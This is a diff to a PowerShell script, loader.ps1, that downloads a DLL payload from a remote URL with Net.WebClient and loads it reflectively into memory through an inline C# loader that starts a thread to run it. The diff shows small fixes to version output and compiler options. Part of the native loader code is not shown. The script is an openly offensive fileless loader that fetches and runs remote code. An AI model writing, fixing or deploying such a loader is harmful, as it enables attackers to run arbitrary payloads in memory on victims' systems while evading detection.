@@ -1,13 +1,11 @@
 # loader.ps1
+
 if ([Environment]::Is64BitProcess) {
     Write-Host "[*] Running in 64-bit PowerShell"
 } else {
     Write-Host "[!] Running in 32-bit PowerShell"
 }
-
-Write-Host "[*] Running under:" `
-           + (Get-Host).Version `
-           + " / " + $PSVersionTable.PSEdition
+Write-Host "[*] Running under: $((Get-Host).Version) / $($PSVersionTable.PSEdition)"
 Write-Host "[*] Is64BitProcess = $([Environment]::Is64BitProcess)"
 
 # 1) Download the DLL bytes
@@ -16,7 +14,7 @@ Write-Host "[*] Downloading payload from $payloadUrl"
 $dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)
 
 # 2) Define the real reflective loader, compiled for x64
-Add-Type -TypeDefinition @"
+Add-Type -Language CSharp -CompilerParameters "/platform:x64" -TypeDefinition @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -43,7 +41,7 @@ public static class ReflectiveLoader {
         WaitForSingleObject(hThread, 0xFFFFFFFF);
     }
 }
-"@ -Language CSharp -CompilerOptions "/platform:x64"
+"@
 
 # 3) Invoke it
 Write-Host "[*] Reflectively loading payload.dll into memory"
